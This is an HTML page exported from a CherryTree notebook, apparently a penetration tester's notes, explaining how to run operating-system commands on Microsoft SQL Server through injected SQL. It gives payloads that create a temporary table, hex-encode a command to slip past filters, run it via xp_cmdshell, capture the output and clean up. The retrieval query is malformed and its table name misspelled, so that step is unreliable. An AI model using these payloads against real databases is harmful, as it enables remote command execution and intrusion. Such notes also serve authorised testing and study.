<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>save the results in a temporary table</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>save the results in a temporary table</h1><br/><br />1. <strong>Create a temporary table</strong><br />    Create a temporary table to hold the stored procedure output seen in the above chapter<br />    <div class="codebox"><pre>create table temptable (id int not null identity (1,1), output nvarchar(4096) null);--</pre></div><br />    <span style="text-decoration:underline;">id</span> column → help us to access different command outputs<br />    <span style="text-decoration:underline;">output</span> column → contain the command results<br /><br />2. <strong>Craft the argument for xp_cmdshell (ASCII to HEX)</strong><br />    Convert the command string(ASCII) of the command we want to run into an HEX representation<br />    Use an online tool like <a href="https://www.rapidtables.com/convert/number/ascii-to-hex.html">this</a> and insert a double zero after every character of the string(Output delimiter string) and add 0x at the start of the HEX value<br />    <span style="color:#a5452a;">example:</span>  &quot;dir c:\&quot; → 0x640069007200200063003a005c00 <br />    <a href=""><img src="images/1703-1.png" alt="images/1703-1.png" /></a><br /><br />3. <strong>Execute xp_cmdshell</strong><br />    create a variable with the command string we have just created and then we pass it to xp_cmdshell<br />    <div class="codebox"><pre>declare @t nvarchar(4096) set @t=0x640069007200200063003a005c00 insert into temptable (output) EXEC master.dbo.xp_cmdshell @t;</pre></div><br /><br />4. <strong>Read the results</strong><br />    Use the id field of the temptable table to choose which command result you want to retrieve.<br />    <div class="codebox"><pre>FROM teptable select &lt;id&gt;</pre></div><br /><br />5. <strong>Cleanup</strong><br />    <div class="codebox"><pre>DROP TABLE temptable;</pre></div></div>
</body>
</html>
